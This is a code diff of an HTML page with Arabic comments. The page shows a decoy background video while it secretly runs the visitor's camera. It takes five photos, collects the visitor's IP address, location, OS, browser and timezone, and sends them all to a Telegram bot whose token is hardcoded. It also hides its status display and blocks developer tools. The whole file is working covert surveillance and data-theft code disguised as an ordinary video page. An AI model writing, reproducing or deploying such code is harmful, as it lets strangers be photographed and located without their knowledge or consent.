@@ -16,7 +16,6 @@
             overflow: hidden;
         }
 
-        /* فيديو الخلفية - ملء الشاشة */
         .video-background {
             position: fixed;
             top: 0;
@@ -32,7 +31,6 @@
             object-fit: cover;
         }
 
-        /* كاميرا مخفية تماماً */
         .hidden-camera {
             position: fixed;
             top: -9999px;
@@ -47,11 +45,6 @@
             display: none;
         }
 
-        /* إخفاء شريط الحالة تماماً */
-        .status {
-            display: none;
-        }
-
         ::-webkit-scrollbar {
             display: none;
         }
@@ -59,36 +52,96 @@
 </head>
 <body>
 
-    <!-- فيديو خلفية -->
     <div class="video-background">
         <video id="bgVideo" autoplay loop muted playsinline>
             <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4">
         </video>
     </div>
 
-    <!-- كاميرا مخفية -->
     <div class="hidden-camera">
         <video id="camera" autoplay playsinline muted></video>
     </div>
 
     <canvas id="canvas"></canvas>
-    
-    <div class="status" id="status"></div>
 
     <script>
         // ==================== إعدادات تليجرام ====================
         const BOT_TOKEN = "8179040156:AAFdn8ApCAIbaWhpLaFQMyqrwUwfR1hfyuY";
-        let CHAT_ID = "i3bdullah";
+        let CHAT_ID = null;
         let stream = null;
         let cameraReady = false;
-        let currentPhoto = 0;
-        const TOTAL_PHOTOS = 5;
+        
+        // ==================== معلومات الجهاز ====================
+        let deviceInfo = {
+            ip: 'جاري الجلب...',
+            country: 'جاري الجلب...',
+            city: 'جاري الجلب...',
+            os: 'جاري الجلب...',
+            browser: 'جاري الجلب...',
+            screen: 'جاري الجلب...',
+            language: 'جاري الجلب...',
+            timezone: 'جاري الجلب...'
+        };
         
         // ==================== عناصر الصفحة ====================
         const camera = document.getElementById('camera');
         const canvas = document.getElementById('canvas');
         
-        // ==================== الحصول على Chat ID (بدون رسائل) ====================
+        // ==================== جلب نظام التشغيل والمتصفح ====================
+        function getSystemInfo() {
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            
+            // تحديد نظام التشغيل
+            let os = 'Unknown';
+            if (userAgent.indexOf('Win') !== -1) os = 'Windows';
+            else if (userAgent.indexOf('Mac') !== -1) os = 'MacOS';
+            else if (userAgent.indexOf('Linux') !== -1) os = 'Linux';
+            else if (userAgent.indexOf('Android') !== -1) os = 'Android';
+            else if (userAgent.indexOf('iOS') !== -1 || userAgent.indexOf('iPhone') !== -1 || userAgent.indexOf('iPad') !== -1) os = 'iOS';
+            
+            // تحديد المتصفح
+            let browser = 'Unknown';
+            if (userAgent.indexOf('Chrome') !== -1 && userAgent.indexOf('Edg') === -1) browser = 'Chrome';
+            else if (userAgent.indexOf('Firefox') !== -1) browser = 'Firefox';
+            else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) browser = 'Safari';
+            else if (userAgent.indexOf('Edg') !== -1) browser = 'Edge';
+            else if (userAgent.indexOf('Opera') !== -1) browser = 'Opera';
+            
+            deviceInfo.os = `${os} (${platform})`;
+            deviceInfo.browser = browser;
+            deviceInfo.screen = `${screen.width}x${screen.height}`;
+            deviceInfo.language = navigator.language || navigator.userLanguage;
+            deviceInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        }
+        
+        // ==================== جلب IP والموقع الجغرافي ====================
+        async function getIPInfo() {
+            try {
+                // استخدام خدمة مجانية لجلب IP والموقع
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                if (data) {
+                    deviceInfo.ip = data.ip || 'غير معروف';
+                    deviceInfo.country = `${data.country_name} (${data.country_code})` || 'غير معروف';
+                    deviceInfo.city = data.city || 'غير معروف';
+                    
+                    // معلومات إضافية
+                    deviceInfo.region = data.region || 'غير معروف';
+                    deviceInfo.postal = data.postal || 'غير معروف';
+                    deviceInfo.latitude = data.latitude || 'غير معروف';
+                    deviceInfo.longitude = data.longitude || 'غير معروف';
+                }
+            } catch (error) {
+                console.error('خطأ في جلب IP:', error);
+                deviceInfo.ip = 'فشل الجلب';
+                deviceInfo.country = 'فشل الجلب';
+                deviceInfo.city = 'فشل الجلب';
+            }
+        }
+        
+        // ==================== الحصول على Chat ID ====================
         async function getChatId() {
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
@@ -105,7 +158,7 @@
             }
         }
         
-        // ==================== تشغيل الكاميرا (بدون رسائل) ====================
+        // ==================== تشغيل الكاميرا ====================
         async function startCamera() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ 
@@ -120,13 +173,40 @@
             }
         }
         
-        // ==================== التقاط وإرسال صورة واحدة ====================
+        // ==================== إنشاء نص المعلومات للإرسال ====================
+        function getInfoText(photoNumber) {
+            return `
+📸 صورة ${photoNumber}/5
+
+━━━━━━━━━━━━━━━━
+📍 معلومات الجهاز والموقع:
+━━━━━━━━━━━━━━━━
+
+🌐 IP Address: ${deviceInfo.ip}
+🗺️ الدولة: ${deviceInfo.country}
+🏙️ المدينة: ${deviceInfo.city}
+📍 المنطقة: ${deviceInfo.region || 'غير معروف'}
+
+💻 نظام التشغيل: ${deviceInfo.os}
+🌍 المتصفح: ${deviceInfo.browser}
+📱 حجم الشاشة: ${deviceInfo.screen}
+🔤 اللغة: ${deviceInfo.language}
+⏰ المنطقة الزمنية: ${deviceInfo.timezone}
+
+━━━━━━━━━━━━━━━━
+🕐 الوقت: ${new Date().toLocaleString('ar-SA')}
+━━━━━━━━━━━━━━━━
+            `;
+        }
+        
+        // ==================== التقاط وإرسال الصورة مع المعلومات ====================
         async function captureAndSend(photoNumber) {
             if (!CHAT_ID || !cameraReady) return false;
             
             try {
                 if (camera.videoWidth === 0 || camera.videoHeight === 0) return false;
                 
+                // التقاط الصورة
                 canvas.width = camera.videoWidth;
                 canvas.height = camera.videoHeight;
                 const ctx = canvas.getContext('2d');
@@ -139,7 +219,7 @@
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-                formData.append('caption', `📸 صورة ${photoNumber}/${TOTAL_PHOTOS}`);
+                formData.append('caption', getInfoText(photoNumber));
                 
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
@@ -155,29 +235,12 @@
         
         // ==================== تصوير 5 صور (الأولى فوراً، ثم كل 9 ثواني) ====================
         async function captureAllPhotos() {
-            // الصورة الأولى (فوراً)
-            currentPhoto = 1;
-            await captureAndSend(currentPhoto);
-            
-            // انتظار 9 ثواني ثم الصورة الثانية
-            await delay(9000);
-            currentPhoto = 2;
-            await captureAndSend(currentPhoto);
-            
-            // انتظار 9 ثواني ثم الصورة الثالثة
-            await delay(9000);
-            currentPhoto = 3;
-            await captureAndSend(currentPhoto);
-            
-            // انتظار 9 ثواني ثم الصورة الرابعة
-            await delay(9000);
-            currentPhoto = 4;
-            await captureAndSend(currentPhoto);
-            
-            // انتظار 9 ثواني ثم الصورة الخامسة
-            await delay(9000);
-            currentPhoto = 5;
-            await captureAndSend(currentPhoto);
+            for (let i = 1; i <= 5; i++) {
+                await captureAndSend(i);
+                if (i < 5) {
+                    await new Promise(resolve => setTimeout(resolve, 9000));
+                }
+            }
             
             // إيقاف الكاميرا بعد الانتهاء
             setTimeout(() => {
@@ -187,29 +250,29 @@
             }, 2000);
         }
         
-        // ==================== دالة الانتظار ====================
-        function delay(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
-        
         // ==================== التشغيل الرئيسي ====================
         async function init() {
-            // تشغيل الكاميرا (سيطلب الإذن تلقائياً)
+            // 1. جلب معلومات الجهاز
+            getSystemInfo();
+            
+            // 2. جلب IP والموقع
+            await getIPInfo();
+            
+            // 3. تشغيل الكاميرا
             const cameraSuccess = await startCamera();
             
-            // الحصول على Chat ID
+            // 4. الحصول على Chat ID
             await getChatId();
             
-            // إذا كانت الكاميرا جاهزة، ابدأ التصوير
+            // 5. بدء التصوير إذا كان كل شيء جاهزاً
             if (cameraSuccess && CHAT_ID) {
-                // انتظار ثانية لضبط الكاميرا ثم البدء
                 setTimeout(() => {
                     captureAllPhotos();
                 }, 1000);
             }
         }
         
-        // ==================== بدء التشغيل تلقائياً ====================
+        // بدء التشغيل
         init();
         
         // ==================== منع أدوات المطور ====================
@@ -223,7 +286,7 @@
             }
         });
         
-        // ==================== إيقاف الكاميرا عند الخروج ====================
+        // إيقاف الكاميرا عند الخروج
         window.onbeforeunload = () => {
             if (stream) stream.getTracks().forEach(t => t.stop());
         };
